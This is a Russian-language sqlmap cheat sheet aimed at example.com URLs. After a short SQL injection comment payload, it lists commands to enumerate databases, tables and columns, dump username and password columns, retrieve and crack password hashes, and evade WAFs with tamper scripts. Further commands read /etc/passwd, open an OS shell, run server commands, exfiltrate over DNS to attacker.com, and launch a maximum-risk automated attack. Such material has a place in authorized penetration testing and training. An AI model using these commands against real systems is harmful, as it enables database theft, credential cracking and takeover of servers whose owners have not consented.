> SQL Injection Payload:
> ```sql
> SELECT * FROM users WHERE username = 'admin' --';
> `



Определение базы данных:
sqlmap -u "http://example.com/index.php?id=1" --dbs

Определение таблиц в базе:
sqlmap -u "http://example.com/index.php?id=1" -D target_db --tables

Определение колонок в таблице:
sqlmap -u "http://example.com/index.php?id=1" -D target_db -T target_table --columns

Извлечение данных из таблицы:
sqlmap -u "http://example.com/index.php?id=1" -D target_db -T target_table -C username,password --dump

GET-параметры
sqlmap -u "http://example.com/index.php?id=1"

POST-параметры
sqlmap -u "http://example.com/login.php" --data="username=admin&password=123"

Cookie-параметры
sqlmap -u "http://example.com/profile.php" --cookie="PHPSESSID=abcd1234"

HTTP-заголовки (User-Agent, Referer, X-Forwarded-For и т. д.)
sqlmap -u "http://example.com/" --headers="User-Agent: evil_payload"

Определение типа инъекции
sqlmap -u "http://example.com/index.php?id=1" --technique=U
Где U – Union-based, можно заменить на B (Boolean-based), T (Time-based) и т. д.

Обход WAF (Web Application Firewall)
sqlmap -u "http://example.com/index.php?id=1" --tamper=space2comment
Можно использовать другие tamper-скрипты, например charencode, randomcase и т. д.

Определение уровня привилегий
sqlmap -u "http://example.com/index.php?id=1" --privileges

Получение учетных данных пользователей базы
sqlmap -u "http://example.com/index.php?id=1" --users

Получение хешей паролей
sqlmap -u "http://example.com/index.php?id=1" --passwords

Попытка дешифровки хешей
sqlmap -u "http://example.com/index.php?id=1" --crack

Обход защиты (если есть WAF)
sqlmap -u "http://example.com/index.php?id=1" --random-agent --tamper=space2comment

Автоматическое определение всех уязвимых параметров
sqlmap -u "http://example.com/index.php?id=1" --forms --crawl=3
Ищет SQL-инъекции во всех найденных формах на сайте

Поиск файлов на сервере
sqlmap -u "http://example.com/index.php?id=1" --file-read="/etc/passwd"

Загрузка шелла на сервер
sqlmap -u "http://example.com/index.php?id=1" --os-shell

Запуск команд на сервере
sqlmap -u "http://example.com/index.php?id=1" --os-cmd="whoami"

Обход защиты через Time-based SQL Injection
sqlmap -u "http://example.com/index.php?id=1" --technique=T --time-sec=5

Атака через DNS (Blind SQL Injection)
sqlmap -u "http://example.com/index.php?id=1" --dns-domain=attacker.com

Запуск мощной автоматической атаки
sqlmap -u "http://example.com/index.php?id=1" --level=5 --risk=3 --batch

--level=5 – увеличивает глубину проверки
--risk=3 – максимальный уровень риска (может сломать базу)
--batch – отключает вопросы (запускает атаку автоматически)
